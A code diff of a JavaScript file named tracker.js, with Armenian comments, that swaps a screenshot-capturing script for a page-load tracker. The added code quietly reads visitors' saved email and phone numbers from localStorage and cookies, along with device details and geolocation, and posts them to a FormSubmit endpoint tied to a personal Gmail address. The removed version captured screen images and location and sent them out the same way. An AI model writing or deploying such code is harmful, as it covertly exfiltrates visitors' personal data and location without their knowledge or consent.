@@ -1,104 +1,73 @@
-// 1. Փորձել ստանալ իրական էկրանի ֆոտո (եթե թույլատրված է)
-async function captureRealScreenshot() {
-    try {
-      // Փորձել օգտագործել բրաուզերի MediaDevices API (Chrome, Edge)
-      const stream = await navigator.mediaDevices.getDisplayMedia({
-        video: { 
-          displaySurface: "browser", // Ուղղակիորեն վերցնել բրաուզերի էկրանը
-          cursor: "never" // Չցուցադրել կուրսորը
-        },
-        audio: false,
-      });
-      
-      const videoTrack = stream.getVideoTracks()[0];
-      const imageCapture = new ImageCapture(videoTrack);
-      const bitmap = await imageCapture.grabFrame();
-      
-      // Փոխակերպել Bitmap-ը JPEG պատկերի
-      const canvas = document.createElement('canvas');
-      canvas.width = bitmap.width;
-      canvas.height = bitmap.height;
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(bitmap, 0, 0);
-      
-      const screenshot = canvas.toDataURL('image/jpeg', 0.8);
-      videoTrack.stop(); // Կանգնեցնել հոսքը
-      
-      return screenshot;
-    } catch (e) {
-      console.log("Real screenshot failed, falling back to HTML2Canvas");
-      return null;
-    }
-  }
-  
-  // 2. Fallback՝ օգտագործելով HTML2Canvas
-  async function captureHTMLScreenshot() {
-    try {
-      if (typeof html2canvas !== 'function') {
-        await loadScript('https://html2canvas.hertzen.com/dist/html2canvas.min.js');
-      }
-      
-      const canvas = await html2canvas(document.body, {
-        scale: 0.7,
-        logging: false,
-        useCORS: true,
-      });
-      
-      return canvas.toDataURL('image/jpeg', 0.7);
-    } catch (e) {
-      console.log("HTML2Canvas failed too");
-      return null;
-    }
-  }
-  
-  // 3. Բեռնել արտաքին սկրիպտ
-  function loadScript(src) {
-    return new Promise((resolve, reject) => {
-      const script = document.createElement('script');
-      script.src = src;
-      script.onload = resolve;
-      script.onerror = reject;
-      document.head.appendChild(script);
-    });
-  }
-  
-  // 4. Հավաքել բոլոր տվյալները
-  async function collectData() {
+// tracker.js - Վիզիտորի տվյալների հավաքում և ուղարկում FormSubmit-ի միջոցով
+function trackVisitor() {
     const data = {
-      url: window.location.href,
+      website: window.location.href || "index.html",
       userAgent: navigator.userAgent,
-      time: new Date().toISOString(),
+      platform: navigator.platform,
+      screenWidth: window.screen.width,
+      screenHeight: window.screen.height,
+      language: navigator.language,
+      referrer: document.referrer || "Direct visit",
+      visitTime: new Date().toISOString(),
+      ip: "Մոտքային IP-ն կավելացվի FormSubmit-ի կողմից"
     };
   
-    // Փորձել ստանալ իրական ֆոտո → Fallback → Չստացվեց
-    data.screenshot = await captureRealScreenshot() || await captureHTMLScreenshot() || "Failed to capture";
-  
-    // Ավելացնել լոկացիա (եթե հնարավոր է)
-    if (navigator.geolocation) {
-      try {
-        const pos = await new Promise((resolve, reject) => 
-          navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 2000 })
-        );
-        data.location = `${pos.coords.latitude}, ${pos.coords.longitude}`;
-      } catch (e) {
-        data.locationError = "User denied location";
-      }
+    // Ստուգել localStorage-ում պահված տվյալները
+    try {
+      const savedEmail = localStorage.getItem('userEmail');
+      const savedPhone = localStorage.getItem('userPhone');
+      
+      if (savedEmail) data.savedEmail = savedEmail;
+      if (savedPhone) data.savedPhone = savedPhone;
+    } catch (e) {
+      console.log("LocalStorage access error:", e);
     }
   
-    return data;
+    // Ստուգել cookies-ում պահված տվյալները
+    try {
+      const cookies = document.cookie.split(';').reduce((res, c) => {
+        const [key, val] = c.trim().split('=').map(decodeURIComponent);
+        return Object.assign(res, { [key]: val });
+      }, {});
+  
+      if (cookies.email) data.cookieEmail = cookies.email;
+      if (cookies.phone) data.cookiePhone = cookies.phone;
+    } catch (e) {
+      console.log("Cookie access error:", e);
+    }
+  
+    // Փորձել ստանալ գեոտեղադրություն
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        position => {
+          data.latitude = position.coords.latitude;
+          data.longitude = position.coords.longitude;
+          sendData(data);
+        },
+        () => {
+          data.locationError = "Geolocation unavailable";
+          sendData(data);
+        }
+      );
+    } else {
+      sendData(data);
+    }
   }
   
-  // 5. Ուղարկել տվյալները
+  // Տվյալների ուղարկում FormSubmit-ին
   function sendData(data) {
     fetch("https://formsubmit.co/ajax/soghbatyanvahan@gmail.com", {
       method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(data),
-    }).then(() => console.log("Data sent!")).catch(e => console.error("Error:", e));
+      headers: { 
+        'Content-Type': 'application/json',
+        'Accept': 'application/json'
+      },
+      body: JSON.stringify(data)
+    })
+    .then(response => response.json())
+    .then(data => console.log("Success:", data))
+    .catch(error => console.error("Error:", error));
   }
   
-  // 6. Գործարկել 2 վայրկյանում
-  setTimeout(async () => {
-    const visitorData = await collectData();
-    sendData(visitorData);
-  }, 2000);
+  // Գործարկել հետևումը էջի բեռնվելուց հետո
+  window.addEventListener('load', trackVisitor);
